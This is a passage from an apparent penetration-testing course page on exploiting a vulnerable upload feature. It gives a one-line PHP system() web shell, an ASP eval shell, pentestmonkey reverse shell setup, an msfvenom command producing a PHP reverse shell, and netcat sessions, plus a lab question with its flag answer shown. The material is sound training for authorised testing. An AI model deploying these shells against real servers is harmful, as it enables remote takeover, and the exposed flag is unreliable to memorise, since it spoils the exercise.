
<h1>Upload Exploitation</h1>
<hr/>
<p>The final step in exploiting this web application is to upload the malicious script in the same language as the web application, like a web shell or a reverse shell script. Once we upload our malicious script and visit its link, we should be able to interact with it to take control over the back-end server.</p>
<hr/>
<h2>Web Shells</h2>
<p>We can find many excellent web shells online that provide useful features, like directory traversal or file transfer. One good option for <code>PHP</code> is <a href="https://github.com/Arrexel/phpbash">phpbash</a>, which provides a terminal-like, semi-interactive web shell. Furthermore, <a href="https://github.com/danielmiessler/SecLists/tree/master/Web-Shells">SecLists</a> provides a plethora of web shells for different frameworks and languages, which can be found in the <code>/opt/useful/seclists/Web-Shells</code> directory in <code>PwnBox</code>.</p>
<p>We can download any of these web shells for the language of our web application (<code>PHP</code> in our case), then upload it through the vulnerable upload feature, and visit the uploaded file to interact with the web shell. For example, let's try to upload <code>phpbash.php</code> from <a href="https://github.com/Arrexel/phpbash">phpbash</a> to our web application, and then navigate to its link by clicking on the Download button:
<img class="website-screenshot" data-url="http://SERVER_IP:PORT/uploads/phpbash.php" src="/storage/modules/136/file_uploads_php_bash.jpg"/></p>
<p>As we can see, this web shell provides a terminal-like experience, which makes it very easy to enumerate the back-end server for further exploitation. Try a few other web shells from SecLists, and see which ones best meet your needs.</p>
<hr/>
<h2>Writing Custom Web Shell</h2>
<p>Although using web shells from online resources can provide a great experience, we should also know how to write a simple web shell manually. This is because we may not have access to online tools during some penetration tests, so we need to be able to create one when needed.</p>
<p>For example, with <code>PHP</code> web applications, we can use the <code>system()</code> function that executes system commands and prints their output, and pass it the <code>cmd</code> parameter with <code>$_REQUEST['cmd']</code>, as follows:</p>
<pre><code class="language-php">&lt;?php system($_REQUEST['cmd']); ?&gt;
</code></pre>
<p>If we write the above script to <code>shell.php</code> and upload it to our web application, we can execute system commands with the <code>?cmd=</code> GET parameter (e.g. <code>?cmd=id</code>), as follows:
<img class="website-screenshot" data-url="http://SERVER_IP:PORT/uploads/shell.php?cmd=id" src="/storage/modules/136/file_uploads_php_manual_shell.jpg"/></p>
<p>This may not be as easy to use as other web shells we can find online, but it still provides an interactive method for sending commands and retrieving their output. It could be the only available option during some web penetration tests.</p>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0"><b>Tip:</b> If we are using this custom web shell in a browser, it may be best to use source-view by clicking <code>[CTRL+U]</code>, as the source-view shows the command output as it would be shown in the terminal, without any HTML rendering that may affect how the output is formatted.</p>
</div>
</div>
<p>Web shells are not exclusive to <code>PHP</code>, and the same applies to other web frameworks, with the only difference being the functions used to execute system commands. For <code>.NET</code> web applications, we can pass the <code>cmd</code> parameter with <code>request('cmd')</code> to the <code>eval()</code> function, and it should also execute the command specified in <code>?cmd=</code> and print its output, as follows:</p>
<pre><code class="language-asp">&lt;% eval request('cmd') %&gt;
</code></pre>
<p>We can find various other web shells online, many of which can be easily memorized for web penetration testing purposes. It must be noted that <code>in certain cases, web shells may not work</code>. This may be due to the web server preventing the use of some functions utilized by the web shell (e.g. <code>system()</code>), or due to a Web Application Firewall, among other reasons. In these cases, we may need to use advanced techniques to bypass these security mitigations, but this is outside the scope of this module.</p>
<hr/>
<h2>Reverse Shell</h2>
<p>Finally, let's see how we can receive reverse shells through the vulnerable upload functionality. To do so, we should start by downloading a reverse shell script in the language of the web application. One reliable reverse shell for <code>PHP</code> is the <a href="https://github.com/pentestmonkey/php-reverse-shell">pentestmonkey</a> PHP reverse shell. Furthermore, the same <a href="https://github.com/danielmiessler/SecLists/tree/master/Web-Shells">SecLists</a> we mentioned earlier also contains reverse shell scripts for various languages and web frameworks, and we can utilize any of them to receive a reverse shell as well.</p>
<p>Let's download one of the above reverse shell scripts, like the <a href="https://github.com/pentestmonkey/php-reverse-shell">pentestmonkey</a>, and then open it in a text editor to input our <code>IP</code> and listening <code>PORT</code>, which the script will connect to. For the <code>pentestmonkey</code> script, we can modify lines <code>49</code> and <code>50</code> and input our machine's IP/PORT:</p>
<pre><code class="language-php">$ip = 'OUR_IP';     // CHANGE THIS
$port = OUR_PORT;   // CHANGE THIS
</code></pre>
<p>Next, we can start a <code>netcat</code> listener on our machine (with the above port), upload our script to the web application, and then visit its link to execute the script and get a reverse shell connection:</p>
<pre><code class="language-shell-session">[!bash!]$ nc -lvnp OUR_PORT
listening on [any] OUR_PORT ...
connect to [OUR_IP] from (UNKNOWN) [188.166.173.208] 35232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre>
<p>As we can see, we successfully received a connection back from the back-end server that hosts the vulnerable web application, which allows us to interact with it for further exploitation. The same concept can be used for other web frameworks and languages, with the only difference being the reverse shell script we use.</p>
<hr/>
<h2>Generating Custom Reverse Shell Scripts</h2>
<p>Just like web shells, we can also create our own reverse shell scripts. While it is possible to use the same previous <code>system</code> function and pass it a reverse shell command, this may not always be very reliable, as the command may fail for many reasons, just like any other reverse shell command.</p>
<p>This is why it is always better to use core web framework functions to connect to our machine. However, this may not be as easy to memorize as a web shell script. Luckily, tools like <code>msfvenom</code> can generate a reverse shell script in many languages and may even attempt to bypass certain restrictions in place. We can do so as follows for <code>PHP</code>:</p>
<pre><code class="language-shell-session">[!bash!]$ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw &gt; reverse.php
...SNIP...
Payload size: 3033 bytes
</code></pre>
<p>Once our <code>reverse.php</code> script is generated, we can once again start a <code>netcat</code> listener on the port we specified above, upload the <code>reverse.php</code> script and visit its link, and we should receive a reverse shell as well:</p>
<pre><code class="language-shell-session">[!bash!]$ nc -lvnp OUR_PORT
listening on [any] OUR_PORT ...
connect to [OUR_IP] from (UNKNOWN) [181.151.182.286] 56232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre>
<p>Similarly, we can generate reverse shell scripts for several languages. We can use many reverse shell payloads with the <code>-p</code> flag and specify the output language with the <code>-f</code> flag.</p>
<p>While reverse shells are always preferred over web shells, as they provide the most interactive method for controlling the compromised server, they may not always work, and we may have to rely on web shells instead. This can be for several reasons, like having a firewall on the back-end network that prevents outgoing connections or if the web server disables the necessary functions to initiate a connection back to us.</p>
<div class="mb-5 pwnbox-select-card"></div>
<div id="screen" style="height: 600px; border: 1px solid;">
<div class="screenPlaceholder">
<div class="instanceLoading" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Instance is starting...</div>
</div>
<div class="instanceTerminating" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Terminating instance...</div>
</div>
<div class="row instanceStart max-width-canvas">
<div class="col-4"></div>
<div class="col-4">
<button class="startInstanceBtn btn btn-success text-light btn-lg btn-block" style="margin-top: 270px;">Start Instance
                            </button>
<p class="text-center mt-2 font-size-13 font-secondary">
<span class="text-success spawnsLeft">
<i class="fal fa-infinity"></i>
</span> / 1 spawns left
                            </p>
</div>
<div class="col-4"></div>
</div>
</div>
</div>
<div class="row align-center justify-center my-4">
<div class="col-5 justify-start">
<button class="instance-button fullScreenBtn btn btn-light btn-sm float-left" style="display:none;" target="_blank"><i class="fad fa-expand text-success mr-1"></i>  Full Screen
                    </button>
<button class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2" style="display:none;"><i class="fad fa-times text-danger"></i>  Terminate
                    </button>
<button class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1" style="display:none;"><i class="fad fa-sync text-warning mr-2"></i>  Reset
                    </button>
<div class="btn-group" role="group">
<button class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1" style="display:none;cursor: default;">Life Left:
                            <span class="lifeLeft"></span>m
                        </button>
<button class="extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm" data-title="Extend Life" data-toggle="tooltip" style="display:none;"><i class="fa fa-plus text-success"></i></button>
</div>
</div>
<div class="col-7 justify-end pt-2 pr-2 font-size-small text-right" id="statusText">Waiting to
                    start...
                </div>
</div>
<div class="d-inline-block mb-2 solutionSettings solutionSettingsOffsets" id="solutionsModuleSetting">
<div class="border border-secondary p-2 rounded">
<div class="custom-control custom-switch d-flex">
<input class="custom-control-input" disabled="" id="showSolutionsModuleSetting" type="checkbox"/>
<label class="custom-control-label font-size-14 font-weight-normal text-white" for="showSolutionsModuleSetting">
                                Enable step-by-step solutions for all questions
                            </label>
<span aria-hidden="true" class="cursor-pointer font-size-14 ml-1 mr-1 text-white" data-content="Access to this feature is exclusive to annual subscribers. To acquire an annual subscription, kindly proceed by clicking &lt;a href='/billing'&gt;here&lt;/a&gt;." data-html="true" data-placement="top" data-toggle="popover" data-trigger="click" title="Activate Solutions">
<i class="fa fa-info-circle font-size-12"></i>
</span>
<img alt="sparkles-icon-decoration" class="ml-2 w-auto sparkles-icon" height="20" src="/images/sparkles-solid.svg">
</img></div>
</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Questions</h4>
<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below
                                to complete this Section and earn cubes!</p>
<span class="spawnTargetBtn spawn-target-text-clone d-none">Click here to spawn the target
                                system!</span>
<p class="card-title-desc font-size-large font-size-15 mb-0">
    Target(s): <span class="text-success">
<span class="target" style="cursor:pointer;">
<i class="fad fa-circle-notch fa-spin"></i>
<span class="spawnTargetBtn">Fetching status...</span>
</span>
</span>
<button class="resetTargetBtn btn btn-light btn-sm" data-title="Reset Target(s)" data-toggle="tooltip" style="cursor: pointer; display: none;">
<i class="fad fa-sync text-warning"></i>
</button>
<br/>
<div class="d-flex align-items-center targetLifeContainer">
<span class="targetLifeTimeContainer" style="display: none;">
            Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
                    </span>
</div>
</p>
</div>
<div class="col-3 text-right float-right">
<button class="btn btn-light bg-color-blue-nav mt-2 w-100 d-flex align-items-center" data-target="#cheatSheetModal" data-toggle="modal">
<div><i class="fad fa-file-alt mr-2"></i></div>
<div class="text-center w-100 ml-1">Cheat Sheet</div>
</button>
</div>
</div>
<div>
<div>
<label class="module-question" for="859"><span class="badge badge-soft-dark font-size-14 mr-2">+ 1 <i class="fad fa-cube text-success"></i></span> Try to exploit the upload feature to upload a web shell and get the content of /flag.txt
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control text-success" disabled="true" type="text" value="HTB{g07_my_f1r57_w3b_5h3ll}"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="859" disabled="true" id="btnAnswer859">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
</div>
</div>
<div class="">
</div>
</div>
</div>
</div>
</div>
